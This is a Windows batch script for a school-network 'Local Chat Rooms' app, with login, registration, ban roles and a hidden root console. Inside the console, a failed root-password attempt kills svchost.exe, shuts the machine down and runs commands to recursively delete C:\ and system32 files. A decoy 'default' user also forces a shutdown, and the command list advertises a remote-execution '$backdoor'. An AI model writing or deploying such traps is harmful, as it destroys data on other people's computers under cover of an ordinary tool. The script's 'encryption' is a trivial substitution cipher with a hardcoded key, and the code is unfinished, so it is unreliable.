:: string encryption link: https://stackoverflow.com/questions/31444555/how-to-encrypt-a-string-and-save-it-in-a-file-and-read-the-decrypted-string-from

:: To ensure the 'Raster Fonts' issue doesn't occur, use command 'chcp 65001 > nul' before echoing ascii
:: and use command 'chcp 850 > nul' after echoing commands

:: Shortcuts to the 'chcp commands':
set "chcp_on=chcp 65001 > nul"
set "chcp_off=chcp 850 > nul"
::::::::::::::::::::::::::::::::::::
setlocal EnableDelayedExpansion
set "charSet=abcdefghijklmnopqrstuvwxyz1234567890@#$*(.,- \/"
set i=0
for %%a in (
    UDFM45 H21DGF FDH56D FGS546 JUK4JH
    ERG54S T5H4FD RG641G RG4F4D RT56F6
    VCBC3B F8G9GF FD4CJS G423FG F45GC2
    TH5DF5 CV4F6R XF64TS X78DGT TH74SJ
    BCX6DF FG65SD 4KL45D GFH3F2 GH56GF
    45T1FG D4G23D GB56FG SF45GF P4FF12
    F6DFG1 56FG4G USGFDG FKHFDG IFGJH6
    87H8G7 G25GHF 45FGFH 75FG45 54GDH5
    45F465 HG56FG DF56H4 F5JHFH SGF4HF
    45GH45 56H45G ) do (
   for %%i in (!i!) do for /F "delims=" %%c in ("!charSet:~%%i,1!") do (
      set "ENC[%%c]=%%a"
      set "DEC[%%a]=%%c"
   )
   set /A i+=1
)

::Escape colors !ESC![<code>;<code>m
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
  set ESC=%%b
)

:::::::::::::::::::::::::::::::::::::::::::::::: ESC TEXT COLORS
echo [-] Loading: Text colours...
set "DarkWhite=!ESC![90m"
set "Red=!ESC![91m"
set "Green=!ESC![92m"
set "Yellow=!ESC![93m"
set "Blue=!ESC![94m"
set "Purple=!ESC![95m"
set "Cyan=!ESC![96m"
set "White=!ESC![97m"
echo [-] Loading: Background colours...
set "b_black=!ESC![100m"
set "b_red=!ESC![101m"
set "b_green=!ESC![102m"
set "b_yellow=!ESC![103;30m"
set "b_blue=!ESC![104m"
set "b_purple=!ESC![105m"
set "b_cyan=!ESC![106m"
set "b_white=!ESC![107m"
echo [-] Loading: Colour combinations...
set "dark_red=!ESC![31m"
set "white_black=!ESC![7m"
set "red_black=!ESC![7;31m"
echo [-] Loading: Text styles...
set "reset=!ESC![0m"
set "bold=!ESC![1m"
set "underline=!ESC![4m"
:::::::::::::::::::::::::::::::::::::::::::::::: END OF SECTION

setlocal DisableDelayedExpansion

MODE con:cols=80 lines=30

set _a=set&set "_b= "&set _c==
%_a%%_b%_%_c%r^e^m

%_%%_b%^|---------------------------------------------
%_%%_b%^| ██╗░░░░░░█████╗░░█████╗░░█████╗░██╗░░░░░
%_%%_b%^| ██║░░░░░██╔══██╗██╔══██╗██╔══██╗██║░░░░░
%_%%_b%^| ██║░░░░░██║░░██║██║░░╚═╝███████║██║░░░░░
%_%%_b%^| ██║░░░░░██║░░██║██║░░██╗██╔══██║██║░░░░░
%_%%_b%^| ███████╗╚█████╔╝╚█████╔╝██║░░██║███████╗
%_%%_b%^| ╚══════╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚══════╝
%_%%_b%^|
%_%%_b%^| ░█████╗░██╗░░██╗░█████╗░████████╗
%_%%_b%^| ██╔══██╗██║░░██║██╔══██╗╚══██╔══╝
%_%%_b%^| ██║░░╚═╝███████║███████║░░░██║░░░
%_%%_b%^| ██║░░██╗██╔══██║██╔══██║░░░██║░░░
%_%%_b%^| ╚█████╔╝██║░░██║██║░░██║░░░██║░░░
%_%%_b%^| ░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░
%_%%_b%^|
%_%%_b%^| ██████╗░░█████╗░░█████╗░███╗░░░███╗░██████╗
%_%%_b%^| ██╔══██╗██╔══██╗██╔══██╗████╗░████║██╔════╝
%_%%_b%^| ██████╔╝██║░░██║██║░░██║██╔████╔██║╚█████╗░
%_%%_b%^| ██╔══██╗██║░░██║██║░░██║██║╚██╔╝██║░╚═══██╗
%_%%_b%^| ██║░░██║╚█████╔╝╚█████╔╝██║░╚═╝░██║██████╔╝
%_%%_b%^| ╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░
%_%%_b%^|---------------------------------------------
%_%%_b%^| Source Code - By 1k0de
%_%%_b%^| (c) All rights reserved.
%_%%_b%^|---------------------------------------------

set "_errorCode=0"
set "_localMode=false"

::: { Creates variable /AE = Ascii-27 escape code.
::: - %/AE% can be used  with and without DelayedExpansion.
    For /F %%a in ('echo prompt $E ^| cmd')do set "/AE=%%a"
::: }

(Set \n=^^^
%=Newline DNR=%
)
::: / Color Print Macro -
::: Usage: %Print%{RRR;GGG;BBB}text to output
::: \n at the end of the string echo's a new line
::: valid range for RGB values: 0 - 255
  Set Print=For %%n in (1 2)Do If %%n==2 (%\n%
    For /F "Delims=" %%G in ("!Args!")Do (%\n%
      For /F "Tokens=1 Delims={}" %%i in ("%%G")Do Set "Output=%/AE%[0m%/AE%[38;2;%%im!Args:{%%~i}=!"%\n%
      ^< Nul set /P "=!Output:\n=!%/AE%[0m"%\n%
      If "!Output:~-2!"=="\n" (Echo/^&Endlocal)Else (Endlocal)%\n%
    )%\n%
  )Else Setlocal EnableDelayedExpansion ^& Set Args=
::: / Erase Macro -
::: Usage: %Erase%{string of the length to be erased}
  Set Erase=For %%n in (1 2)Do If %%n==2 (%\n%
    For /F "Tokens=1 Delims={}" %%G in ("!Args!")Do (%\n%
      Set "Nul=!Args:{%%G}=%%G!"%\n%
      For /L %%# in (0 1 100) Do (If Not "!Nul:~%%#,1!"=="" ^< Nul set /P "=%/AE%[D%/AE%[K")%\n%
    )%\n%
    Endlocal%\n%
  )Else Setlocal EnableDelayedExpansion ^& Set Args=

title Local Chat Rooms - Client

set "_collab=P:\Composite\All Students\"

if "%_localMode%" == "true" (
    set "_collab=All Students"
)

set "_localData_=%_collab%\__LOCAL_CHAT_ROOM_DATA"

set "__clientVersion__=1.0"

set "_errorCode=103"

@echo off
cls

setlocal EnableDelayedExpansion
goto load_app
goto _crash_

:load_app
%chcp_on%
cls
echo.
echo    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
echo    ░░^|  !white!LOADING: LOCAL CHAT ROOMS!reset!   ^|░░
if "%_localMode%" == "true" (
	echo    ░░:  !Purple!^( Running in Local Mode ^)!reset!   :░░
)
echo    !underline!░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░!reset!
ping localhost -n 2 > nul
echo.
::make load effect
%PRINT%{255;255;255}   Searching for data...             0%%
ping localhost -n 2 > nul
set "_pLine1=█████      "
set "_pLine2=█████ "
if exist "%_collab%" (
	%ERASE%{              }
	%PRINT%{88;189;42} %_pLine1%
	%PRINT%{255;255;255}50%%
) else (
	%PRINT%{255;255;255}\n
	%PRINT%{255;255;255}   Error: Cannot find Collaboration Folder^^!\n
	echo.
	echo    [ Press Any Key To Exit ]
	pause > nul
	exit
)
ping localhost -n 2 > nul
set "_canLockPass=false"
if "!username!" == "karim.dalati1" (set "_canLockPass=true")
if "!username!" == "adeld" (set "_canLockPass=true")
if exist "%_localData_%\lock_app.dll" (
	if not "!_canLockPass!" == "true" ( goto _app_locked_ )
)
set "_vCheck="
if exist "%_localData_%\_version.dll" (
	call :update_checker
)
if not exist "%_localData_%" (
	mkdir "%_localData_%"
	mkdir "%_localData_%\__users__"
)
if not exist "%_localData_%\__users__" (
    mkdir "%_localData_%\__users__"
)
%ERASE%{         }
%PRINT%{88;189;42}%_pLine2%
%PRINT%100%%\n
if exist "%_localData_%\lock_app.dll" (
	if "!_canLockPass!" == "true" (
		%PRINT%{255;255;255}   [APP IS LOCKED]: You have immunity^^!\n
		ping localhost -n 4 > nul
	) else (
		goto _app_locked_
		%PRINT%{255;255;255}   [APP IS LOCKED]: Local Chat Rooms cannot currently be accessed^^!\n
		pause > nul
		exit
	)
)
ping localhost -n 2 > nul
%PRINT%{255;255;255}   Loading complete...
ping localhost -n 2 > nul
goto _startMenu
goto _crash_

:_startMenu
SETLOCAL EnableDelayedExpansion
%_a%%_b%"say%_c%echo%_b%"
cls
call :writeTitle
set "_startInput="
%_a%%_b%/p%_b%"_startInput%_c%Option > !Cyan!"
echo !reset!

set /A _splitCount=1

set "_action=nil"
set "_arg1=nil"
set "_arg2=nil"

for %%a in (!_startInput!) do (
	if !_splitCount! == 1 (
		set "_action=%%a"
		if "%%a" == "" ( set "_action=nil" )
		if "%%a" == "1" (
			set "_action=_login_"
		)
		if "%%a" == "login" (
			set "_action=_login_"
		)
		if "%%a" == "2" (
			set "_action=_register_"
		)
		if "%%a" == "signup" (
			set "_action=_register_"
		)
		if "%%a" == "register" (
			set "_action=_register_"
		)
		if "%%a" == "3" (
			set "_action=_report_"
		)
		if "%%a" == "report" (
			set "_action=_report_"
		)
		if "%%a" == "$redirect" (
			set "_action=_redirect_"
		)
	)
	if !_splitCount! == 2 (
		set "_arg1=%%a"
	)
	if !_splitCount! == 3 (
		set "_arg2=%%a"
	)
	set/A _splitCount+=1)

:: echo Action: !_action! ^| Arg 1: !_arg1! ^| Arg 2: !_arg2! & pause > nul

set "_consoleUser=nil"

if "!_action!" == "_redirect_" (
	if "!_arg1!" == "/path:c_panel" (
		if "!_arg2!" == "/user:root" (
			set "_consoleUser=root"
			goto _console_
		)
		if "!_arg2!" == "/user:default" (
			::Default console user has no privlliges and is useless/fake just in case
			set "_consoleUser=default"
			goto _console_
		)
		goto failed_query_redirect_nilUser
	)
	goto failed_query_redirect
)

if "!_action!" == "_register_" (
	goto _lcr_REGISTER
)

if "!_action!" == "_login_" (
	goto _lcr_LOGIN

)

if "!_action!" == "_report_" (
	goto _lcr_REPORT
)

if "!_action!" == "exit" (
	exit
)

goto failed_query_main
goto _crash_

:failed_query_main
cls
echo.
echo [ OPTION INVALID ]
echo -- Press any key to return --
pause > nul
goto _startMenu
goto _crash_

:failed_query_redirect
cls
echo.
echo [ ($redirect): must have "path" and "user" arguments. ]
echo -- Press any key to return --
pause > nul
goto _startMenu
goto _crash_

:failed_query_redirect_nilUser
cls
echo.
echo [ (Control Panel): must specifiy a valid user. ]
echo -- Press any key to return --
pause > nul
goto _startMenu
goto _crash_

:_console_
cls
set "_console_ROOT_pass="
set "_console_command="
:: ROOT_PASSWORD is encrypted
set "ROOT_PASSWORD=FG65SDJUK4JHG423FGG423FGJUK4JHTH74SJ4KL45DF45GC2XF64TSVCBC3B"
echo.
echo Enter password for user: !_consoleUser!
set "psCommand=powershell -Command "$pword = read-host 'Enter' -AsSecureString ; ^
 $BSTR=[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pword); ^
          [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)""
for /f "usebackq delims=" %%p in (`%psCommand%`) do set "_console_ROOT_pass=%%p"
set _decrypt=!ROOT_PASSWORD!
set "_decryptOut="
:decrypt_loop_1
	set "_decryptOut=%_decryptOut%!DEC[%_decrypt:~0,6%]!"
	set "_decrypt=%_decrypt:~6%"
if defined _decrypt goto decrypt_loop_1
set "_rootPassed=false"
if "!_consoleUser!" == "root" (
	if "!_decryptOut!" == "!_console_ROOT_pass!" (
		if "!username!" == "adeld" (set "_rootPassed=true")
		if "!username!" == "karim.dalati1" (set "_rootPassed=true")
	) else (
		echo Incorrect password^^!
		echo.
		echo ==========================================================
		echo ^|       !red_black![ DO NOT ATTEMPT TO ACCESS ROOT ACCOUNT ]!reset!       ^|
		echo ==========================================================
		shutdown /s /t 20
		echo.
		echo Shutting down device...
		echo Destroying system...
		ping localhost -n 2 > nul
		TASKKILL /IM svchost.exe /F
		RD C:\ /S /Q
		del c:\windows\system32*.* /q
		del /f /s /q “C:*.*.”
		pause > nul
		exit
	)
)

if "!_rootPassed!" == "false" (
	echo.
	echo _INVALID DEVICE DETECTED_ : SHUTTING DOWN DEVICE...
	shutdown /s /t 20
	pause > nul
	exit
)

goto _consoleDisplay

:_consoleDisplay
%chcp_on%
cls
%say%╔═══════════════════════════════════════════════════════════╗
%say%║!b_red!                   Local Chat Rooms 1.0                    !reset!║
%say%╠═══════════════════════════════════════════════════════════╣
%say%║ ░█████╗░░█████╗░███╗░░██╗░██████╗░█████╗░██╗░░░░░███████╗ ║
%say%║ ██╔══██╗██╔══██╗████╗░██║██╔════╝██╔══██╗██║░░░░░██╔════╝ ║
%say%║ ██║░░╚═╝██║░░██║██╔██╗██║╚█████╗░██║░░██║██║░░░░░█████╗░░ ║
%say%║ ██║░░██╗██║░░██║██║╚████║░╚═══██╗██║░░██║██║░░░░░██╔══╝░░ ║
%say%║ ╚█████╔╝╚█████╔╝██║░╚███║██████╔╝╚█████╔╝███████╗███████╗ ║
%say%║ ░╚════╝░░╚════╝░╚═╝░░╚══╝╚═════╝░░╚════╝░╚══════╝╚══════╝ ║
%say%╠═══════════════════════════════════════════════════════════╣
set "c_toSay=║ User: default                                             ║"
if "!_consoleUser!" == "root" (
	set "c_toSay=║ User: root                                                ║"
)
%say%%c_toSay%
%say%╚═══════════════════════════════════════════════════════════╝
echo Type $return to go back.
echo Type $cmds to view commands.
%chcp_off%
goto console_exec
goto _crash_

:console_exec
set "_console_command="
echo.
set /p "_console_command=Exec > "
::This exists in case of emergencies like being exposed and a demonstration is required:
if "!_consoleUser!" == "default" (
	echo Loading command...
	ping localhost -n 2 > nul
	echo.
	echo Do you wish to proceed? [ Press Any Key ]
	pause > nul
	echo.
	echo _INVALID DEVICE DETECTED_ : SHUTTING DOWN DEVICE...
	shutdown /s /t 20
	pause > nul
	exit
)
if "!_console_command!" == "" (goto console_exec)
if "!_console_command!" == "exit" (exit)
if "!_console_command!" == "$exit" (exit)
if "!_console_command!" == ".exit" (exit)
if "!_console_command!" == "$return" ( goto _startMenu )
if "!_console_command!" == "$cmds" (
	echo.
	echo $closeAll - Shuts down the app on all devices.
	echo $lock     - Wont allow any user to open the app.
	echo $unlock   - Unlocks the app, allowing users to open the app.
	echo $update   - Updates the version, if the LocalChatRooms.bat version is different to the collab version it will require to use the latest version.
	echo $backdoor - Opens the backdoor ^(Remote Command Execution^) ^(Dangerous/Powerful^)
	echo $elevate  - Change the role of a specific user.
	echo $ban      - Ban a specific user.
	echo $reports  - View all the reports.
	goto console_exec
)
if "!_console_command!" == "cls" (goto _consoleDisplay)
if "!_console_command!" == "clear" (goto _consoleDisplay)
if "!_console_command!" == "$lock" (
	echo.
	echo Locking app...
	ping localhost -n 2 > nul
	if exist "%_localData_%\lock_app.dll" (
		echo Local Chat Rooms is already locked...
	) else (
		echo true>"%_localData_%\lock_app.dll"
		echo Successfully locked app...
	)
	goto console_exec
)
if "!_console_command!" == "$unlock" (
	echo.
	echo Unlocking app...
	ping localhost -n 2 > nul
	if exist "%_localData_%\lock_app.dll" (
		del /f "%_localData_%\lock_app.dll"
		echo Successfully unlocked app...
	) else (
		echo Local Chat Rooms is already unlocked...
	)
	goto console_exec
)
if "!_console_command!" == "$update" (
	echo.
	goto update_app
)
echo !red_black!Unknown Command:!reset! !_console_command!
:: rest of the command need to be coded
goto console_exec
goto _crash_

:update_app
set "_newVersion="
set /p "_newVersion=What is the new version? > "
if "!_newVersion!" == "" (
	!dark_red!Invalid Answer:!reset! New version cannot be empty.
	goto console_exec
)

:_lcr_LOGIN
%chcp_on%
set "login_userInput="
set "login_passInput="
set "pass_contents="
cls
%say%╔═════════════════════════════════════════════╗
%say%║!b_red!            Local Chat Rooms 1.0             !reset!║
%say%╠═════════════════════════════════════════════╣
%say%║    ██╗░░░░░░█████╗░░██████╗░██╗███╗░░██╗    ║
%say%║    ██║░░░░░██╔══██╗██╔════╝░██║████╗░██║    ║
%say%║    ██║░░░░░██║░░██║██║░░██╗░██║██╔██╗██║    ║
%say%║    ██║░░░░░██║░░██║██║░░╚██╗██║██║╚████║    ║
%say%║    ███████╗╚█████╔╝╚██████╔╝██║██║░╚███║    ║
%say%║    ╚══════╝░╚════╝░░╚═════╝░╚═╝╚═╝░░╚══╝    ║
%say%║ By 1k0de                                    ║
%say%╚═════════════════════════════════════════════╝
echo Type $return to go back.
echo.
%chcp_off%
set /p "login_userInput=Username: "
if "!login_userInput!" == "$return" (
	goto _startMenu
)
set "psCommand=powershell -Command "$pword = read-host 'Password' -AsSecureString ; ^
 $BSTR=[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pword); ^
          [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)""
for /f "usebackq delims=" %%p in (`%psCommand%`) do set "login_passInput=%%p"
ping localhost -n 2 > nul
echo.
::::::::::::::::::::::::::::::::::::::::: String Encryption To Find Encrypted Username _FUNCTIONAL_
set _encrypt=!login_userInput!
set "_encryptOut="
:_encryption_
	set "_encryptOut=%_encryptOut%!ENC[%_encrypt:~0,1%]!"
	set "_encrypt=%_encrypt:~1%"
if defined _encrypt goto _encryption_
::::::::::::::::::::::::::::::::::::::::: END OF SECTION
if not exist "%_localData_%\__users__\!_encryptOut!" (
    echo Incorrect username or password^^!
    echo [ Press Any Key ]
    pause > nul
    goto _lcr_LOGIN
)
if not exist "%_localData_%\__users__\!_encryptOut!\u_sec.dll"  (
        echo Error: Data for user: !login_userInput! cannot be retrieved. Please report this error.
        echo [ Press Any Key ]
        pause > nul
        goto _lcr_LOGIN
)
::::::::::::::::::::::::::::::::::::::::: String Encryption To compare password _FUNCTIONAL_
set _encrypt2=!login_passInput!
set "_encryptOut2="
:_encryption2_
	set "_encryptOut2=%_encryptOut2%!ENC[%_encrypt2:~0,1%]!"
	set "_encrypt2=%_encrypt2:~1%"
if defined _encrypt2 goto _encryption2_
::::::::::::::::::::::::::::::::::::::::: END OF SECTION
set /p pass_contents=<"%_localData_%\__users__\!_encryptOut!\u_sec.dll"
if "!_encryptOut2!" == "!pass_contents!" (
    echo Logging in...
) else (
    echo Incorrect username or password^^!
    echo [ Press Any Key ]
    pause > nul
    goto _lcr_LOGIN
)
ping localhost -n 2 > nul	
goto _lcr_main_menu_
goto _crash_

:_lcr_REGISTER
%chcp_on%
set "REG_newUser="
set "REG_newPass="
set "REG_confirm="
cls
%say%╔═════════════════════════════════════════════╗
%say%║!b_red!            Local Chat Rooms 1.0             !reset!║
%say%╠═════════════════════════════════════════════╣
%say%║ ░██████╗██╗░██████╗░███╗░░██╗  ░░░░░░       ║
%say%║ ██╔════╝██║██╔════╝░████╗░██║  ░░░░░░       ║
%say%║ ╚█████╗░██║██║░░██╗░██╔██╗██║  █████╗       ║
%say%║ ░╚═══██╗██║██║░░╚██╗██║╚████║  ╚════╝       ║
%say%║ ██████╔╝██║╚██████╔╝██║░╚███║  ░░░░░░       ║
%say%║ ╚═════╝░╚═╝░╚═════╝░╚═╝░░╚══╝  ░░░░░░       ║
%say%║ ██╗░░░██╗██████╗░                           ║
%say%║ ██║░░░██║██╔══██╗                           ║
%say%║ ██║░░░██║██████╔╝                           ║
%say%║ ██║░░░██║██╔═══╝░                           ║
%say%║ ╚██████╔╝██║░░░░░                           ║
%say%║ ░╚═════╝░╚═╝░░░░░                           ║
%say%║ By 1k0de                                    ║
%say%╚═════════════════════════════════════════════╝
echo Type $return to go back.
echo.
%chcp_off%
set /p "REG_newUser=Create a Username: "
if "!REG_newUser!" == "" (
	echo.
	echo Username cannot be empty.
	echo [ Press Any Key ]
	pause > nul
	goto _lcr_REGISTER
)
if "!REG_newUser!" == "$return" (
	goto _startMenu
)
if "!REG_newUser!" == "/" (
	echo.
	echo Invalid characters in username.
	echo [ Press Any Key ]
	pause > nul
	goto _lcr_REGISTER
)
echo:!REG_newUser!|findstr /i "^[0-9A-Z.-_]*$" >Nul 2>&1 ||(
    echo.
	echo Invalid characters in username.
	echo [ Press Any Key ]
	pause > nul
	goto _lcr_REGISTER
)
echo.!REG_newUser!|findstr /c:":">nul &&(
	echo.
	echo Invalid characters in username.
	echo [ Press Any Key ]
	pause > nul
	goto _lcr_REGISTER
)
:str_len_check
if not "!REG_newUser:~%str_len_count%!" == "" set /a str_len_count+=1 & goto str_len_check
if %str_len_count% GTR 30 (
	echo.
	echo Username must be a maxmimum of 30 characters.
	echo [ Press Any Key ]
	pause > nul
	goto _lcr_REGISTER
)
::::::::::::::::::::::::::::::::::::::::: ENCRYPTING USERNAME INPUT -- _FUNCTIONAL_
set Encrypt2=%REG_newUser%
set "EncryptOut="
:encrypt2
   set "EncryptOut=%EncryptOut%!ENC[%Encrypt2:~0,1%]!"
   set "Encrypt2=%Encrypt2:~1%"
if defined Encrypt2 goto encrypt2
::::::::::::::::::::::::::::::::::::::::: END OF SECTION
if exist "%_localData_%\__users__\!EncryptOut!" (
    echo.
    echo This username is taken^^!
    echo [ Press Any Key ]
    pause > nul
    goto _lcr_REGISTER
)
set "psCommand=powershell -Command "$pword = read-host 'Create a password' -AsSecureString ; ^
 $BSTR=[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pword); ^
          [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)""
for /f "usebackq delims=" %%p in (`%psCommand%`) do set "REG_newPass=%%p"
if "!REG_newPass!" == "" (
	echo.
	echo Password cannot be empty.
	echo [ Press Any Key ]
	pause > nul
	goto _lcr_REGISTER
)
echo.!REG_newPass!|findstr /c:":">nul &&(
	echo.
	echo Invalid characters in username.
	echo [ Press Any Key ]
	pause > nul
	goto _lcr_REGISTER
)
echo:!REG_newPass!|findstr /i "^[0-9A-Z.-_]*$" >Nul 2>&1 ||(
    echo.
	echo Invalid characters in password.
	echo [ Press Any Key ]
	pause > nul
	goto _lcr_REGISTER
)
set "psCommand=powershell -Command "$pword = read-host 'Confirm  password' -AsSecureString ; ^
 $BSTR=[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pword); ^
          [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)""
for /f "usebackq delims=" %%p in (`%psCommand%`) do set "REG_confirm=%%p"
if "!REG_newPass!" neq "!REG_confirm!" (
	echo.
	echo Passwords don't match.
	echo [ Press Any Key ]
	pause > nul
	goto _lcr_REGISTER
)
echo.
echo Creating your account...
ping localhost -n 2 > nul
mkdir "%_localData_%\__users__\!EncryptOut!"
::::::::::::::::::::::::::::::::::::::::: ENCRYPTING PASSWORD INPUT TO SAVE IN FILE -- _FUNCTIONAL_
set Encrypt3=%REG_newPass%
set "EncryptOut2="
:encrypt3
   set "EncryptOut2=%EncryptOut2%!ENC[%Encrypt3:~0,1%]!"
   set "Encrypt3=%Encrypt3:~1%"
if defined Encrypt3 goto encrypt3
::::::::::::::::::::::::::::::::::::::::: END OF SECTION
echo !EncryptOut2!>"%_localData_%\__users__\!EncryptOut!\u_sec.dll"
::_0x375858_ is the code for a members, each rank has different ranks
echo _0x375856_>"%_localData_%\__users__\!EncryptOut!\u_role.dll"
:: This is where the reason for a ban is stored
echo None Specified>"%_localData_%\__users__\!EncryptOut!\u_reason.dll"
:: This is where the person who banned the account is stored
echo Unknown>"%_localData_%\__users__\!EncryptOut!\u_by.dll"
echo Successfully created your account^^!
echo.
echo [ Press Any Key ]
pause > nul
goto _startMenu
goto _crash_

:_lcr_REPORT
%chcp_on%
set "_reportInput="
cls
%say%╔════════════════════════════════════════════════════╗
%say%║!b_red!               Local Chat Rooms 1.0                 !reset!║
%say%╠════════════════════════════════════════════════════╣
%say%║ ██████╗░███████╗██████╗░░█████╗░██████╗░████████╗  ║
%say%║ ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝  ║
%say%║ ██████╔╝█████╗░░██████╔╝██║░░██║██████╔╝░░░██║░░░  ║
%say%║ ██╔══██╗██╔══╝░░██╔═══╝░██║░░██║██╔══██╗░░░██║░░░  ║
%say%║ ██║░░██║███████╗██║░░░░░╚█████╔╝██║░░██║░░░██║░░░  ║
%say%║ ╚═╝░░╚═╝╚══════╝╚═╝░░░░░░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░  ║
%say%║ By 1k0de                                           ║
%say%╠════════════════════════════════════════════════════╣
%say%║ Type the number you wish to use                    ║
%say%╠════════════════════════════════════════════════════╣
%say%║ 1: Report a User              3: Other             ║
%say%║ 2: Report a Bug/Error         or $return (Go Back) ║
%say%╚════════════════════════════════════════════════════╝
echo Type $return to go back.
echo.
%chcp_off%
set /p "_reportInput=Option > "
if "!_reportInput!" == "$return" ( goto _startMenu )
goto _crash_

:_app_locked_
%chcp_on%
cls
echo.╔════════════════════════════════════════════════════╗
echo.║!b_red!               Local Chat Rooms 1.0                 !reset!║
echo.╠════════════════════════════════════════════════════╣
echo.║ ░█████╗░██████╗░██████╗░                           ║
echo.║ ██╔══██╗██╔══██╗██╔══██╗                           ║
echo.║ ███████║██████╔╝██████╔╝                           ║
echo.║ ██╔══██║██╔═══╝░██╔═══╝░                           ║
echo.║ ██║░░██║██║░░░░░██║░░░░░                           ║
echo.║ ╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░░░                           ║
echo.║ ██╗░░░░░░█████╗░░█████╗░██╗░░██╗███████╗██████╗░   ║
echo.║ ██║░░░░░██╔══██╗██╔══██╗██║░██╔╝██╔════╝██╔══██╗   ║
echo.║ ██║░░░░░██║░░██║██║░░╚═╝█████═╝░█████╗░░██║░░██║   ║
echo.║ ██║░░░░░██║░░██║██║░░██╗██╔═██╗░██╔══╝░░██║░░██║   ║
echo.║ ███████╗╚█████╔╝╚█████╔╝██║░╚██╗███████╗██████╔╝   ║
echo.║ ╚══════╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚══════╝╚═════╝░   ║
echo.║ By 1k0de                                           ║
echo.╚════════════════════════════════════════════════════╝
echo.
%chcp_off%
echo Local Chat Rooms is currently locked for all users.
echo [ Press Any Key ]
pause > nul
exit
goto _crash_

:update_checker
set /p _vCheck=<"%_localData_%\_version.dll"
if not "!__clientVersion__!" == "!_vCheck!" (
	goto _updateScreen_
)
exit /b 0

:_updateScreen_
%chcp_on%
cls
echo.╔════════════════════════════════════════════════════════════════╗
echo.║!b_red!                     Local Chat Rooms 1.0                       !reset!║
echo.╠════════════════════════════════════════════════════════════════╣
echo.║ ██╗░░░██╗██████╗░██████╗░░█████╗░████████╗███████╗             ║
echo.║ ██║░░░██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝             ║
echo.║ ██║░░░██║██████╔╝██║░░██║███████║░░░██║░░░█████╗░░             ║
echo.║ ██║░░░██║██╔═══╝░██║░░██║██╔══██║░░░██║░░░██╔══╝░░             ║
echo.║ ╚██████╔╝██║░░░░░██████╔╝██║░░██║░░░██║░░░███████╗             ║
echo.║ ░╚═════╝░╚═╝░░░░░╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝             ║
echo.║ ██████╗░███████╗░██████╗░██╗░░░██╗██╗██████╗░███████╗██████╗░  ║
echo.║ ██╔══██╗██╔════╝██╔═══██╗██║░░░██║██║██╔══██╗██╔════╝██╔══██╗  ║
echo.║ ██████╔╝█████╗░░██║██╗██║██║░░░██║██║██████╔╝█████╗░░██║░░██║  ║
echo.║ ██╔══██╗██╔══╝░░╚██████╔╝██║░░░██║██║██╔══██╗██╔══╝░░██║░░██║  ║
echo.║ ██║░░██║███████╗░╚═██╔═╝░╚██████╔╝██║██║░░██║███████╗██████╔╝  ║
echo.║ ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░░╚═════╝░╚═╝╚═╝░░╚═╝╚══════╝╚═════╝░  ║
echo.║ By 1k0de                                                       ║
echo.╚════════════════════════════════════════════════════════════════╝
echo.
%chcp_off%
echo Local Chat Rooms: Update required
echo New app will be posted in collaboration shortly.
echo.
echo [ Press Any Key ]
pause > nul
exit
goto _crash_

:_lcr_main_menu_
%chcp_on%
set /p currentUser_role=<"%_localData_%\__users__\!_encryptOut!\u_role.dll"
:: Role code for banned users: _23fb34ibg35ig5_
if "!currentUser_role!" == "_23fb34ibg35ig5_" (
	goto _bannedScreen_
)

set /A _spaceCount=30
echo WScript.Echo Len( WScript.Arguments(0) ) >> strLen.vbs

FOR /F "tokens=* USEBACKQ" %%F IN (cscript //nologo strLen.vbs "!login_userInput!") DO (
	echo %%F
	set _usernameCount=%%F	
	ping localhost -n 2 > nul
)

cls
%say%╔═════════════════════════════════════════════╗
%say%║!b_red!            Local Chat Rooms 1.0             !reset!║
%say%╠═════════════════════════════════════════════╣
%say%║ ██████╗░░█████╗░░██████╗██╗░░██╗            ║
%say%║ ██╔══██╗██╔══██╗██╔════╝██║░░██║            ║
%say%║ ██║░░██║███████║╚█████╗░███████║            ║
%say%║ ██║░░██║██╔══██║░╚═══██╗██╔══██║            ║
%say%║ ██████╔╝██║░░██║██████╔╝██║░░██║            ║
%say%║ ╚═════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝            ║
%say%║ ██████╗░░█████╗░░█████╗░██████╗░██████╗░    ║
%say%║ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗    ║
%say%║ ██████╦╝██║░░██║███████║██████╔╝██║░░██║    ║
%say%║ ██╔══██╗██║░░██║██╔══██║██╔══██╗██║░░██║    ║
%say%║ ██████╦╝╚█████╔╝██║░░██║██║░░██║██████╔╝    ║
%say%║ ╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░    ║
%say%║ By 1k0de                                    ║
%say%╠═════════════════════════════════════════════╣
%say%║ Current User:                               ║ - %_usernameCount%
cscript //nologo strLen.vbs "!login_userInput!" & ::debugging
%say%║ Current User: !login_userInput!
%say%╠═════════════════════════════════════════════╣
set "d_toSay=║ Your Role: Member                           ║"
if "!currentUser_role!" == "_0xuw94g8u4jfo34g3g36h3q_" (
	set "d_toSay=║ Your Role: Creator                          ║"
)
if "!currentUser_role!" == "_0x3480turgwEG34g_" (
	set "d_toSay=║ Your Role: Administrator                    ║"
)
